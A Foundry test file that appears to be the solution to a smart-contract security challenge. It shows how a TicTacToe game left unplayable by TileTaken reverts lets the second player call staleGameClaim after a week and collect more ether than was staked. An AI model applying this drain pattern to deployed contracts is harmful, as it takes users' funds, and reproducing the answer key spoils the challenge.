// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import { TicTacToe } from "../src/TicTacToe.sol";

contract TicTacToeTest is Test {
    TicTacToe public ticTacToeGame;

    address constant playerOne = address(100);
    address constant playerTwo = address(101);

    function setUp() public {
        ticTacToeGame = new TicTacToe();
    }

    function test_Solution() public {

        vm.deal(playerOne, 2 ether);
        vm.deal(playerTwo, 2 ether);
        vm.prank(playerOne);
        ticTacToeGame.startGame{value: 1 ether}(playerTwo);

        TicTacToe.Game memory game = ticTacToeGame.getGame(0);

        //Solution

        vm.startPrank(playerOne);
        for (uint _col; _col < 3; ++_col) {
            for (uint _row; _row < 3; ++_row) {
                vm.expectRevert(TicTacToe.TileTaken.selector);
                ticTacToeGame.makeMove{value: 1 ether}(TicTacToe.Move({ row: _row, col: _col }), 0);
            }
        }
        vm.stopPrank();

        assertEq(game.winner, address(0));

        vm.warp(block.timestamp + 1 weeks);

        uint256 playerTwoBalBefore = payable(playerTwo).balance;

        vm.prank(playerTwo);   
        ticTacToeGame.staleGameClaim(0);

        uint256 playerTwoBalAfter = payable(playerTwo).balance;

        assertGt(playerTwoBalAfter - playerTwoBalBefore, 2 ether);

    }


}